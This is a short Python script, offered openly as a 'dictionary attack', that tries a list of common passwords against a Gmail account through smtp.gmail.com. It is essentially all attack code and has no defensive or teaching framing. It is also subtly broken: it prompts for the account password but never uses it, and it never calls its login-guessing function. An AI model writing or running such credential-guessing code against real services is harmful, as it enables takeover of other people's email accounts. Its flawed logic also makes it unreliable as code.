import smtplib
import getpass

# Gmail SMTP server settings
SMTP_SERVER = "smtp.gmail.com"
SMTP_PORT = 587

# Gmail account credentials
ACCOUNT_EMAIL = input("Enter the Gmail account email: ")
ACCOUNT_PASSWORD = getpass.getpass("Enter the Gmail account password: ")

# Dictionary attack list
PASSWORD_LIST = ["password123", "qwerty", "letmein", "dragonball"]

def brute_force_login():
    for password in PASSWORD_LIST:
        try:
            server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
            server.starttls()
            server.login(ACCOUNT_EMAIL, password)
            print(f"Password found: {password}")
            server.quit()
            return
        except smtplib.SMTPAuthenticationError:
            print(f"Password incorrect: {password}")
            server.quit()
